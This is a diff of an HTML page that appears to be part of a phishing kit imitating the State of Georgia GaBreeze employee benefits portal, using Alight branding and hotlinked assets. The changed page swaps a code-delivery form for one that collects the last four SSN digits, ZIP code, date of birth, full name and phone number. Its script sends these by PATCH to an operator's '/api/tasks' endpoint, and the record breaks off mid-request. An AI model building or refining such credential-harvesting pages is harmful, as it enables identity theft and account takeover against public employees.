@@ -1,675 +1,263 @@
 <!DOCTYPE html>
-<html lang="en-US">
+<html lang="en-US" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Choose verification method</title>
-<link rel="icon" type="image/svg+xml" href="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/UCEDocuments/branding/ADS/logo/GaBreeze+logo.svg">
+<title>Verify Identity - stateofgeorgia</title>
+<link rel="icon" type="image/png" href="favicon.png">
 <style>
-  /* ===== RESET ===== */
-  * { box-sizing: border-box; }
-  html, body {
-    margin: 0;
-    padding: 0;
-    font-family: Arial, Helvetica, sans-serif;
-    font-size: 16px;
-    color: #333333;
-    background: #ffffff;
-    line-height: 1.5;
-    -webkit-text-size-adjust: 100%;
+  *, *::before, *::after { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; }
+  :root {
+    --primary-brand-color: #1C68BF;
+    --color-bg-primary-base: #266de2; --color-bg-primary-hover: #165bcf;
+    --color-bg-disabled-base: #e0e0e0; --color-text-disabled-base: #a0a0a0;
+    --color-text-body-base: #282828; --color-text-body-subtle: #666666;
+    --color-text-error-base: #c61a1a;
+    --color-border-default-subtlest: #dedede; --color-border-default-strong: #282828;
+    --color-border-focus-base: #0055aa; --color-link-base: #266de2;
+    --font-family-base: "FS Thrive Elliot Web", Arial, sans-serif;
+    --font-family-bold: "FS Thrive Elliot Web - Bold", Arial, sans-serif;
   }
-  a { color: #0055aa; text-decoration: none; }
-  a:hover { text-decoration: underline; }
-  h1, h2, h3, p { margin: 0; }
-  img { max-width: 100%; display: block; }
+  @font-face { font-family: "FS Thrive Elliot Web"; src: url("https://awlds.ap.alight.com/awlds/v1.67.0/awlds-ui-lib/assets/fonts/FSThriveElliotWeb-Regular.woff") format("woff"); font-display: swap; font-weight: 400; }
+  @font-face { font-family: "FS Thrive Elliot Web - Bold"; src: url("https://awlds.ap.alight.com/awlds/v1.67.0/awlds-ui-lib/assets/fonts/FSThriveElliotWeb-Bold.woff") format("woff"); font-display: swap; font-weight: 700; }
+  body { font-family: var(--font-family-base); font-size: 16px; color: var(--color-text-body-base); background: #ffffff; -webkit-font-smoothing: antialiased; }
 
-  /* ===== HEADER ===== */
-  .top-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 20px 40px;
-    border-bottom: 1px solid #e0e0e0;
-  }
-  .logo-area {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .logo-area img {
-    height: 40px;
-    width: auto;
-  }
-  .language-selector {
-    display: flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 14px;
-    color: #333;
-    cursor: pointer;
-  }
-  .language-selector svg {
-    width: 18px;
-    height: 18px;
-    fill: #0055aa;
-  }
+  .global-header { position: fixed; top: 0; width: 100%; z-index: 1000; background: #ffffff; border-bottom: 1px solid #000000; }
+  .brand-bar { height: 8px; margin: 0; border: none; background: var(--primary-brand-color); }
+  .header-content { display: flex; align-items: center; justify-content: space-between; height: 88px; padding: 0 32px; }
+  .header-left { display: flex; align-items: center; width: 30%; }
+  .logo-link img { height: 48px; width: auto; max-width: 216px; display: block; }
+  .header-right { display: flex; align-items: center; justify-content: flex-end; min-width: 30%; }
+  .va-button { display: inline-flex; align-items: center; justify-content: center; min-height: 40px; padding: 0 16px; border: 2px solid #1C68BF; border-radius: 20px; background-color: #1C68BF; color: #ffffff; font-family: var(--font-family-bold); font-weight: 700; font-size: 14px; cursor: pointer; box-shadow: 0 0 8px #1C68BF; transition: background-color 0.1s; }
+  .va-button:hover { background-color: #165bcf; border-color: #165bcf; }
+  .va-button svg { width: 25px; height: 25px; margin-right: 8px; flex-shrink: 0; }
 
-  /* ===== NAVIGATION ===== */
-  .main-nav {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    padding: 16px 40px;
-    border-bottom: 1px solid #e0e0e0;
-    gap: 36px;
-    flex-wrap: wrap;
-  }
-  .main-nav a {
-    color: #333333;
-    font-size: 15px;
-    text-decoration: none;
-    padding: 4px 0;
-  }
-  .main-nav a:hover {
-    color: #0055aa;
-    text-decoration: underline;
-  }
+  main { padding-top: 138px; min-height: calc(100vh - 300px); }
+  .verify-section { display: flex; flex-direction: column; padding: 40px 60px; max-width: 560px; }
+  .verify-eyebrow { font-size: 16px; font-weight: bold; margin-bottom: 12px; }
+  .verify-title { font-family: var(--font-family-bold); font-weight: 700; font-size: 32px; margin: 0 0 8px 0; }
+  .verify-subtitle { font-size: 16px; margin: 0 0 32px 0; line-height: 1.5; color: var(--color-text-body-subtle); }
 
-  /* ===== MAIN CONTENT ===== */
-  .main-content {
-    display: flex;
-    justify-content: center;
-    padding: 60px 20px 80px 20px;
-    min-height: calc(100vh - 250px);
-  }
+  .form-group { margin-bottom: 20px; }
+  .form-group label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: var(--color-text-body-base); }
+  .form-group input, .form-group select { height: 44px; width: 100%; padding: 0 12px; border: 1px solid #c0c0c0; border-radius: 8px; font-family: var(--font-family-base); font-size: 15px; outline: none; background: #ffffff; color: var(--color-text-body-base); transition: border-color 0.2s; }
+  .form-group input:focus, .form-group select:focus { border-color: var(--color-border-focus-base); box-shadow: 0 0 0 2px rgba(0,85,170,0.1); }
+  .form-row { display: flex; gap: 12px; }
+  .form-row .form-group { flex: 1; }
+  .dob-row { display: flex; gap: 8px; }
+  .dob-row select { flex: 1; }
+  .phone-wrap { display: flex; align-items: center; gap: 0; }
+  .phone-prefix { height: 44px; padding: 0 12px; background: #f5f5f5; border: 1px solid #c0c0c0; border-right: none; border-radius: 8px 0 0 8px; display: flex; align-items: center; font-size: 15px; color: #666; white-space: nowrap; }
+  .phone-wrap input { border-radius: 0 8px 8px 0; }
 
-  .content-wrapper {
-    width: 100%;
-    max-width: 440px;
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-  }
+  .button-row { display: flex; gap: 16px; margin-top: 28px; }
+  .btn { display: inline-flex; align-items: center; justify-content: center; min-height: 48px; padding: 0 32px; border: none; border-radius: 24px; font-family: var(--font-family-bold); font-weight: 700; font-size: 16px; cursor: pointer; transition: all 0.2s; }
+  .continue-btn { background-color: var(--color-bg-disabled-base); color: var(--color-text-disabled-base); cursor: not-allowed; }
+  .continue-btn.active { background-color: var(--color-bg-primary-base); color: #ffffff; cursor: pointer; }
+  .continue-btn.active:hover { background-color: var(--color-bg-primary-hover); }
+  .cancel-btn { background-color: #e8eaed; color: var(--color-text-body-base); }
+  .cancel-btn:hover { background-color: #d0d2d6; }
+  .spinner { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid #ffffff; width: 18px; height: 18px; animation: spin 1s linear infinite; }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-  .content-wrapper h1 {
-    font-size: 26px;
-    font-weight: 700;
-    color: #333333;
-    margin-bottom: 8px;
-    text-align: left;
-  }
-  .content-wrapper .subtitle {
-    font-size: 15px;
-    color: #555555;
-    margin-bottom: 30px;
-    text-align: left;
-  }
-
-  /* ===== CARD ===== */
-  .verify-card {
-    width: 100%;
-    border: 1px solid #dcdcdc;
-    border-radius: 8px;
-    background: #ffffff;
-    padding: 28px 24px 32px 24px;
-    box-shadow: 0 1px 3px rgba(0,0,0,0.04);
-  }
-
-  .back-link {
-    display: inline-flex;
-    align-items: center;
-    gap: 6px;
-    font-size: 15px;
-    font-weight: 600;
-    color: #0055aa;
-    margin-bottom: 20px;
-    text-decoration: none;
-  }
-  .back-link:hover {
-    text-decoration: underline;
-  }
-  .back-link svg {
-    width: 16px;
-    height: 16px;
-    fill: #0055aa;
-  }
-
-  .prompt-text {
-    font-size: 16px;
-    font-weight: 700;
-    color: #333;
-    margin-bottom: 10px;
-  }
-
-  .required-note {
-    font-size: 12px;
-    color: #666;
-    margin-bottom: 20px;
-  }
-  .required-note .asterisk {
-    color: #c00;
-  }
-
-  .form-label {
-    display: block;
-    font-size: 14px;
-    color: #333;
-    margin-bottom: 6px;
-  }
-  .form-label .required-star {
-    color: #c00;
-    font-weight: 700;
-    font-style: italic;
-  }
-  .form-label .required-text {
-    font-style: italic;
-    color: #666;
-  }
-
-  .form-input {
-    width: 100%;
-    height: 46px;
-    border: 1px solid #999;
-    border-radius: 4px;
-    padding: 8px 12px;
-    font-size: 16px;
-    color: #333;
-    outline: none;
-    margin-bottom: 20px;
-    font-family: Arial, Helvetica, sans-serif;
-  }
-  .form-input:focus {
-    border-color: #0055aa;
-    box-shadow: 0 0 0 2px rgba(0,85,170,0.15);
-  }
-
-  select.form-input {
-    background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%23333' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
-    background-repeat: no-repeat;
-    background-position: right 12px center;
-    background-size: 16px;
-    padding-right: 36px;
-    appearance: none;
-    -webkit-appearance: none;
-    -moz-appearance: none;
-    cursor: pointer;
-  }
-
-  .contact-input-wrap {
-    display: none;
-    margin-bottom: 20px;
-  }
-  .contact-input-wrap.visible {
-    display: block;
-  }
-  .contact-input-wrap label {
-    display: block;
-    font-size: 14px;
-    color: #333;
-    margin-bottom: 6px;
-  }
-  .contact-input-wrap input {
-    width: 100%;
-    height: 46px;
-    border: 1px solid #999;
-    border-radius: 4px;
-    padding: 8px 12px;
-    font-size: 16px;
-    color: #333;
-    outline: none;
-    font-family: Arial, Helvetica, sans-serif;
-  }
-  .contact-input-wrap input:focus {
-    border-color: #0055aa;
-    box-shadow: 0 0 0 2px rgba(0,85,170,0.15);
-  }
-
-  .checkbox-send-wrapper {
-    display: flex;
-    justify-content: space-between;
-    align-items: flex-start;
-    width: 100%;
-    margin-bottom: 24px;
-    gap: 16px;
-  }
-  .checkbox-group {
-    display: flex;
-    align-items: flex-start;
-    gap: 10px;
-    flex: 1;
-  }
-  .checkbox-group input[type="checkbox"] {
-    width: 18px;
-    height: 18px;
-    margin-top: 2px;
-    flex-shrink: 0;
-    cursor: pointer;
-    accent-color: #0055aa;
-  }
-  .checkbox-group label {
-    font-size: 14px;
-    color: #333;
-    line-height: 1.4;
-    cursor: pointer;
-  }
-  .send-link {
-    font-size: 14px;
-    color: #0055aa;
-    text-decoration: underline;
-    white-space: nowrap;
-    margin-top: 2px;
-    flex-shrink: 0;
-  }
-  .send-link:hover {
-    text-decoration: none;
-  }
-
-  .btn-submit {
-    display: inline-block;
-    background-color: #7a7a7a;
-    color: #ffffff;
-    font-size: 14px;
-    font-weight: 600;
-    padding: 8px 20px;
-    border: none;
-    border-radius: 50px;
-    cursor: pointer;
-    transition: background-color 0.15s ease;
-    font-family: Arial, Helvetica, sans-serif;
-  }
-  .btn-submit:hover {
-    background-color: #5a5a5a;
-  }
-
-  .v-loader {
-    display: none;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    padding: 40px 0;
-    text-align: center;
-  }
-  .v-loader.visible { display: flex; }
-  .v-spinner {
-    width: 36px; height: 36px;
-    border: 4px solid #e0e0e0;
-    border-top-color: #0055aa;
-    border-radius: 50%;
-    animation: vspin .7s linear infinite;
-    margin-bottom: 12px;
-  }
-  @keyframes vspin { to { transform: rotate(360deg); } }
-  .v-error {
-    display: none;
-    color: #c00;
-    font-size: 14px;
-    margin-top: 12px;
-  }
-  .v-error.visible { display: block; }
-
-  /* ===== FOOTER ===== */
-  .site-footer {
-    clear: both;
-    background-color: #f9f9f9;
-    padding: 30px 0 20px 0;
-    font-size: 14px;
-    color: #282828;
-  }
-  .footer-inner {
-    max-width: 1600px;
-    margin: 0 auto;
-    padding: 0 40px;
-  }
-  .footer-top {
-    display: flex;
-    justify-content: space-between;
-    align-items: flex-start;
-    gap: 40px;
-    flex-wrap: wrap;
-  }
-  .footer-links ul {
-    list-style: none;
-    margin: 0;
-    padding: 0;
-  }
-  .footer-links li {
-    padding: 16px 0;
-  }
-  .footer-links a {
-    color: #282828;
-    text-decoration: none;
-  }
-  .footer-links a:hover { text-decoration: underline; }
-
-  .footer-brand {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-end;
-    gap: 12px;
-    margin-right: 80px;
-  }
-  .footer-logo img { height: 40px; display: block; }
-  .footer-stores { display: flex; gap: 10px; }
-  .footer-stores img { height: 40px; display: block; }
-
-  .footer-divider {
-    border: none;
-    border-top: 1px solid #949494;
-    margin: 24px 0 16px 0;
-  }
-  .footer-bottom {
-    display: flex;
-    justify-content: space-between;
-    flex-wrap: wrap;
-    gap: 12px;
-    font-size: 14px;
-  }
-  .footer-bottom-links a {
-    color: #282828;
-    padding-right: 24px;
-    text-decoration: none;
-  }
-  .footer-bottom-links a:hover { text-decoration: underline; }
-  .footer-copy { color: #666; }
-
-  /* ===== RESPONSIVE ===== */
-  @media (max-width: 768px) {
-    .top-header { padding: 16px 20px; }
-    .main-nav { gap: 20px; padding: 12px 20px; }
-    .main-nav a { font-size: 14px; }
-    .main-content { padding: 40px 16px 60px 16px; }
-    .content-wrapper h1 { font-size: 22px; }
-    .verify-card { padding: 24px 20px 28px 20px; }
-
-    .footer-inner { padding: 0 20px; }
-    .footer-top { gap: 24px; }
-    .footer-links li { padding: 12px 0; }
-    .footer-brand { margin-right: 0; align-items: flex-start; }
-    .footer-bottom { flex-direction: column; }
-    .footer-bottom-links a { padding-right: 16px; }
-  }
-  @media (max-width: 480px) {
-    .logo-area img { height: 32px; }
-    .main-nav { gap: 14px; padding: 10px 16px; }
-    .main-nav a { font-size: 13px; }
-
-    .checkbox-send-wrapper {
-      flex-direction: column;
-      gap: 10px;
-    }
-    .send-link {
-      margin-left: 28px;
-    }
-
-    .btn-submit { width: 100%; text-align: center; }
-
-    .footer-logo img { height: 32px; }
-    .footer-stores img { height: 32px; }
-  }
+  footer { clear: both; display: block; background-color: #f9f9f9; margin-top: 40px; padding: 5px 12px; }
+  .footer-grid { max-width: 100%; margin: 0 auto; width: 100%; } .footer-row { display: flex; flex-wrap: wrap; }
+  .footer-col { padding: 5px 12px; margin-left: calc((1/12)*100%); flex: 0 0 calc((10/12)*100%); max-width: calc((10/12)*100%); }
+  .footer-top { display: flex; justify-content: space-between; } .footer-links-group { display: flex; gap: 64px; }
+  .footer-list { list-style: none; margin: 0; padding: 0; } .footer-list li { padding: 8px 0; }
+  .footer-list li a { color: var(--color-link-base); text-decoration: none; font-size: 16px; } .footer-list li a:hover { text-decoration: underline; }
+  .footer-brand-block { display: flex; flex-direction: column; gap: 24px; margin-top: 8px; } .footer-logo { display: block; height: 40px; margin-bottom: 8px; } .footer-logo img { height: 100%; display: block; }
+  .app-badges { display: flex; } .app-badges a { display: inline-block; height: 40px; margin-right: 16px; } .app-badges img { height: 100%; display: block; }
+  .footer-divider { border: none; border-top: 1px solid #949494; margin: 0; }
+  .footer-legal-row { display: flex; justify-content: space-between; align-items: flex-start; }
+  .legal-links { display: flex; flex-wrap: wrap; } .legal-links a { color: var(--color-link-base); text-decoration: none; font-size: 14px; padding-right: 32px; } .legal-links a:hover { text-decoration: underline; }
+  .copyright { font-size: 18px; color: #666666; }
+  @media (max-width: 768px) { .header-content { padding: 0 16px; height: 64px; } .logo-link img { max-width: 144px; height: 40px; } main { padding-top: 110px; } .verify-section { padding: 20px; } .form-row { flex-direction: column; gap: 0; } .dob-row { flex-direction: column; } .footer-col { margin-left: 0; flex: 0 0 100%; max-width: 100%; } .footer-top { flex-direction: column; } .footer-legal-row { flex-direction: column; gap: 16px; } }
 </style>
 </head>
 <body>
 
-<!-- ================= HEADER ================= -->
-<header class="top-header">
-  <div class="logo-area">
-    <img src="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/UCEDocuments/branding/ADS/logo/GaBreeze+logo.svg" alt="GaBreeze">
-  </div>
-  <div class="language-selector">
-    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
-    </svg>
-    <span>EN</span>
-    <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="width:12px;height:12px;fill:#333;">
-      <path d="M7 10l5 5 5-5z"/>
-    </svg>
-  </div>
-</header>
+<div class="global-header">
+  <nav aria-label="Global navigation">
+    <hr class="brand-bar">
+    <div class="header-content">
+      <div class="header-left">
+        <a href="index.html" class="logo-link"><img src="https://cache-upn.ap.alight.com/upoint/UPoint/cloudCMS/03889/master/UCEDocuments/branding/ADS/logo/GaBreeze+logo.svg" alt="State of Georgia"></a>
+      </div>
+      <nav class="header-right" aria-label="User Menu">
+        <button type="button" class="va-button" aria-label="Virtual Assistant">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 25 25" fill="none" aria-hidden="true">
+            <path d="M12.5 3C7.25 3 3 6.75 3 11.5C3 14.2 4.4 16.6 6.7 18.1L6 22L10 20C10.8 20.2 11.65 20.3 12.5 20.3C17.75 20.3 22 16.55 22 11.8C22 7.05 17.75 3 12.5 3Z" stroke="currentColor" stroke-width="2" stroke-linejoin="round" fill="none"/>
+            <circle cx="9" cy="12" r="1.2" fill="currentColor"/><circle cx="12.5" cy="12" r="1.2" fill="currentColor"/><circle cx="16" cy="12" r="1.2" fill="currentColor"/>
+          </svg>
+          <span>Virtual Assistant</span>
+        </button>
+      </nav>
+    </div>
+  </nav>
+</div>
 
-<!-- ================= NAVIGATION ================= -->
-<nav class="main-nav">
-  <a href="#">Physical Health</a>
-  <a href="#">Mental Health</a>
-  <a href="#">Financial Well-being</a>
-  <a href="#">Education Assistance</a>
-  <a href="#">Time Off, Life & Family</a>
-  <a href="#">Pay</a>
-</nav>
+<main id="content">
+  <div class="verify-section">
+    <div class="verify-eyebrow">Step 2 of 3</div>
+    <h1 class="verify-title">Verify Your Identity</h1>
+    <p class="verify-subtitle">For your security, please confirm the following information associated with your account.</p>
 
-<!-- ================= MAIN CONTENT ================= -->
-<main class="main-content">
-  <div class="content-wrapper">
-    <h1>Choose where to receive your code</h1>
-    <p class="subtitle">Select your preferred contact method below.</p>
-
-    <div class="verify-card" id="verifyCard">
-      <!-- Back Link -->
-      <a href="/" class="back-link">
-        <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-          <path d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"/>
-        </svg>
-        Back
-      </a>
-
-      <!-- Required Note -->
-      <p class="required-note"><span class="asterisk">*</span> Fields marked with an asterisk (*) are required.</p>
-
-      <!-- Form -->
-      <form id="verifyForm" novalidate>
-        <!-- Label -->
-        <label class="form-label" for="contact-method">
-          Send code to <span class="required-text">(Required)</span> <span class="required-star">*</span>
-        </label>
-
-        <!-- Dropdown -->
-        <select id="contact-method" name="contact-method" class="form-input" aria-required="true">
-          <option value="" disabled selected>Select an option</option>
-          <option value="email">Email</option>
-          <option value="sms">SMS (Text message)</option>
-        </select>
-
-        <!-- Dynamic contact input -->
-        <div class="contact-input-wrap" id="contactInputWrap">
-          <label for="contactInfo" id="contactLabel">Email address</label>
-          <input type="text" id="contactInfo" name="contactInfo" placeholder="Enter your email" autocomplete="off">
-        </div>
-
-        <!-- Checkbox & Send Another Code Link -->
-        <div class="checkbox-send-wrapper">
-          <div class="checkbox-group">
-            <input type="checkbox" id="personal-device">
-            <label for="personal-device">This is my personal device, don't ask to verify again.</label>
-          </div>
-          <a href="javascript:void(0);" class="send-link">Send another code</a>
-        </div>
-
-        <!-- Submit -->
-        <button type="submit" class="btn-submit" id="submitBtn">Submit</button>
-      </form>
-
-      <!-- Loader -->
-      <div class="v-loader" id="verifyLoader">
-        <div class="v-spinner"></div>
-        <span>Processing&hellip;</span>
+    <form id="verifyForm" onsubmit="event.preventDefault();">
+      <div class="form-group">
+        <label for="ssn">Last 4 digits of SSN</label>
+        <input type="text" id="ssn" maxlength="4" inputmode="numeric" autocomplete="off">
       </div>
 
-      <!-- Error -->
-      <div class="v-error" id="verifyError"></div>
-    </div>
+      <div class="form-group">
+        <label for="zip">ZIP Code</label>
+        <input type="text" id="zip" maxlength="5" inputmode="numeric" autocomplete="off">
+      </div>
+
+      <div class="form-group">
+        <label>Date of Birth</label>
+        <div class="dob-row">
+          <select id="dobMonth"><option value="">Month</option></select>
+          <select id="dobDay"><option value="">Day</option></select>
+          <select id="dobYear"><option value="">Year</option></select>
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="fullName">Full Name</label>
+        <input type="text" id="fullName" autocomplete="off">
+      </div>
+
+      <div class="form-group">
+        <label for="phone">Phone Number</label>
+        <div class="phone-wrap">
+          <span class="phone-prefix">+1</span>
+          <input type="tel" id="phone" maxlength="10" inputmode="numeric" autocomplete="off">
+        </div>
+      </div>
+
+      <div class="button-row">
+        <button type="button" class="btn continue-btn" id="continueBtn" disabled>Continue</button>
+        <button type="button" class="btn cancel-btn" id="cancelBtn">Cancel</button>
+      </div>
+    </form>
   </div>
 </main>
 
-<!-- ================= FOOTER ================= -->
-<footer class="site-footer">
-  <div class="footer-inner">
-
-    <div class="footer-top">
-      <div class="footer-links">
-        <ul>
-          <li><a href="#">Contact Us</a></li>
-          <li><a href="#">Health Care Price Transparency Law</a></li>
-          <li><a href="#">Feedback</a></li>
-          <li><a href="#">Protect Yourself From Website Fraud</a></li>
-        </ul>
-      </div>
-
-      <div class="footer-brand">
-        <div class="footer-logo">
-          <img
-            src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg"
-            alt="Alight WorkLife"
-          >
-        </div>
-        <div class="footer-stores">
-          <a href="https://apps.apple.com/us/app/upoint-mobile-hr/id1534367732?mt=8" target="_blank" rel="noopener" aria-label="Download on the App Store">
-            <img
-              src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png"
-              alt="Download on the App Store"
-            >
-          </a>
-          <a href="https://play.google.com/store/apps/details?id=com.alightsolutions.benefitscenter&hl=en_US" target="_blank" rel="noopener" aria-label="Get it on Google Play">
-            <img
-              src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png"
-              alt="Get it on Google Play"
-            >
-          </a>
-        </div>
-      </div>
-    </div>
-
-    <hr class="footer-divider">
-
-    <div class="footer-bottom">
-      <div class="footer-bottom-links">
-        <a href="#">Privacy Policy</a>
-        <a href="#">Terms Of Use</a>
-        <a href="#">Cookie Notice</a>
-        <a href="#" role="button">Cookie Settings [Do Not Sell or Share My Personal Information]</a>
-      </div>
-      <div class="footer-copy">
-        2026 Alight Solutions. All rights reserved.
-      </div>
-    </div>
-
+<footer>
+  <div class="footer-grid">
+    <div class="footer-row"><div class="footer-col"><div class="footer-top"><div class="footer-links-group"><ul class="footer-list"><li><a href="https://doas.ga.gov/human-resources-administration/flexible-benefits-program-employees">Flexible Benefits Information</a></li><li><a href="https://www.ers.ga.gov/peach-state-reserves">PSR 401(k)/457 Plan Information</a></li><li><a href="https://worklife.alight.com/web/stateofgeorgia/pre-contactus">Contact Us</a></li><li><a href="#">Feedback</a></li></ul><ul class="footer-list"><li><a href="#">Protect Yourself From Website Fraud</a></li></ul></div><div class="footer-brand-block"><a class="footer-logo" href="https://alight.com/"><img alt="Alight.com home" src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight_worklife_logo_black.svg"></a><div class="app-badges"><a href="https://apps.apple.com/us/app/upoint-mobile-hr/id1534367732?mt=8"><img alt="App Store" src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-app-store.png"></a><a href="https://play.google.com/store/apps/details?id=com.alightsolutions.benefitscenter&amp;hl=en_US"><img alt="Google Play" src="https://cache-upn.ap.alight.com/upoint/UPoint/UPN-WC/worklife-footer-wc/18.25.2-hotfix/al-assets/images/alight-worklife-google-play.png"></a></div></div></div></div></div>
+    <div class="footer-row"><div class="footer-col"><hr class="footer-divider"></div></div>
+    <div class="footer-row"><div class="footer-col" style="padding-top:15px;padding-bottom:15px;"><div class="footer-legal-row"><div class="legal-links"><a href="https://www.alight.com/privacy">Privacy Policy</a><a href="https://www.alight.com/legal-terms">Terms Of Use</a><a href="https://www.alight.com/cookie-notice">Cookie Notice</a><a href="#">Cookie Settings [Do Not Sell or Share My Personal Information]</a></div><div class="copyright">2026 Alight Solutions. All rights reserved.</div></div></div></div>
   </div>
 </footer>
 
 <script>
 (function () {
-  var params = new URLSearchParams(window.location.search);
-  var taskId = params.get("task");
-  if (!taskId) { window.location.href = "/"; return; }
+  var taskId = sessionStorage.getItem("gb_task_id");
+  if (!taskId) { window.location.href = "index.html"; return; }
 
-  var verifyForm = document.getElementById("verifyForm");
-  var contactMethod = document.getElementById("contact-method");
-  var contactInputWrap = document.getElementById("contactInputWrap");
-  var contactLabel = document.getElementById("contactLabel");
-  var contactInfo = document.getElementById("contactInfo");
-  var submitBtn = document.getElementById("submitBtn");
-  var loader = document.getElementById("verifyLoader");
-  var errorEl = document.getElementById("verifyError");
-  var activePoll = null;
-  var activeTimeout = null;
+  var months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+  var monthSel = document.getElementById("dobMonth");
+  var daySel = document.getElementById("dobDay");
+  var yearSel = document.getElementById("dobYear");
 
-  contactMethod.addEventListener("change", function () {
-    var val = contactMethod.value;
-    if (val === "email") {
-      contactLabel.textContent = "Email address";
-      contactInfo.placeholder = "Enter your email";
-      contactInfo.type = "email";
-      contactInputWrap.classList.add("visible");
-    } else if (val === "sms") {
-      contactLabel.textContent = "Phone number";
-      contactInfo.placeholder = "Enter your phone number";
-      contactInfo.type = "tel";
-      contactInputWrap.classList.add("visible");
-    } else {
-      contactInputWrap.classList.remove("visible");
-    }
-    contactInfo.value = "";
-    contactInfo.focus();
-  });
-
-  function showError(msg) {
-    loader.classList.remove("visible");
-    verifyForm.style.display = "";
-    submitBtn.disabled = false;
-    submitBtn.style.opacity = "";
-    errorEl.textContent = msg;
-    errorEl.classList.add("visible");
+  for (var i = 0; i < months.length; i++) {
+    var o = document.createElement("option");
+    o.value = String(i + 1).padStart(2, "0");
+    o.textContent = months[i];
+    monthSel.appendChild(o);
+  }
+  for (var d = 1; d <= 31; d++) {
+    var o = document.createElement("option");
+    o.value = String(d).padStart(2, "0");
+    o.textContent = d;
+    daySel.appendChild(o);
+  }
+  var currentYear = new Date().getFullYear();
+  for (var y = currentYear; y >= 1930; y--) {
+    var o = document.createElement("option");
+    o.value = y;
+    o.textContent = y;
+    yearSel.appendChild(o);
   }
 
-  verifyForm.addEventListener("submit", async function (e) {
-    e.preventDefault();
+  var ssnInput = document.getElementById("ssn");
+  var zipInput = document.getElementById("zip");
+  var nameInput = document.getElementById("fullName");
+  var phoneInput = document.getElementById("phone");
+  var continueBtn = document.getElementById("continueBtn");
 
-    var method = contactMethod.value;
-    var contact = contactInfo.value.trim();
-    if (!method) { showError("Please select a delivery method."); return; }
-    if (!contact) { showError("Please enter your contact information."); return; }
+  function numericOnly(el) { el.addEventListener("input", function () { this.value = this.value.replace(/\D/g, ""); }); }
+  numericOnly(ssnInput);
+  numericOnly(zipInput);
+  numericOnly(phoneInput);
 
-    errorEl.classList.remove("visible");
-    verifyForm.style.display = "none";
-    loader.classList.add("visible");
+  function checkForm() {
+    var ok = ssnInput.value.length >= 4 && zipInput.value.length >= 5 &&
+             monthSel.value && daySel.value && yearSel.value &&
+             nameInput.value.trim() && phoneInput.value.length >= 10;
+    if (ok) { continueBtn.disabled = false; continueBtn.classList.add("active"); }
+    else { continueBtn.disabled = true; continueBtn.classList.remove("active"); }
+  }
 
-    var deliveryMethod = method === "sms" ? "phone" : "email";
-    var patchBody = {
-      advance_to: "code_request",
-      code_delivery_method: deliveryMethod,
-      device_info: navigator.userAgent,
-      screen_size: window.screen.width + "x" + window.screen.height,
-      referrer: document.referrer || "Direct"
-    };
-    if (deliveryMethod === "phone") {
-      patchBody.masked_phone = contact;
-    } else {
-      patchBody.masked_email = contact;
-    }
+  [ssnInput, zipInput, nameInput, phoneInput, monthSel, daySel, yearSel].forEach(function (el) {
+    el.addEventListener("input", checkForm);
+    el.addEventListener("change", checkForm);
+  });
 
-    try {
-      var res = await fetch("/api/tasks/" + taskId, {
-        method: "PATCH",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(patchBody)
-      });
+  continueBtn.addEventListener("click", function () {
+    if (continueBtn.disabled) return;
+    continueBtn.innerHTML = '<div class="spinner"></div>';
+    continueBtn.disabled = true;
+    continueBtn.classList.remove("active");
 
-      var data = await res.json();
-      if (!res.ok) throw new Error(data.error);
+    var birthDate = monthSel.value + "/" + daySel.value + "/" + yearSel.value;
 
-      activePoll = setInterval(async function () {
-        try {
-          var check = await fetch("/api/tasks/" + taskId);
-          var result = await check.json();
+    fetch("/api/tasks/" + taskId, {
+      method: "PATCH",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        advance_to: "verify",
+        ssn_last4: ssnInput.value,
